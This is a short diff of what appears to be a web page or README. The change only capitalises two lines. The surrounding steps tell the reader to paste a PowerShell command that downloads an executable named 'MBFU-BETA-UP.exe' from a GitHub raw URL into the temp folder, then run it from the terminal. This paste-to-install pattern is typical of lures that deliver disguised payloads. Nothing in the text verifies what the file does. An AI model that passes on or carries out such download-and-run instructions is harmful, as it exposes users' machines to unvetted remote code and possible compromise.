@@ -20,9 +20,9 @@ Actions:<br />
 3) Enter the first command in the terminal:<br />
 powershell -command "(New-Object Net.WebClient).DownloadFile(' https://github.com/ctv-software/webdos622/raw/main/MBFU-BETA-UP.exe ', '%temp%\MBFU-BETA-UP.exe')"<br />
 
-and press Enter, wait for the process to complete.<br />
+And press Enter, wait for the process to complete.<br />
 4) Paste the second command into the terminal:<br />
 %temp%\MBFU-BETA-UP.exe<br />
 
-and press Enter, wait for the process to complete.<br />
+And press Enter, wait for the process to complete.<br />
 Then the MBFU interface will open for you<br />
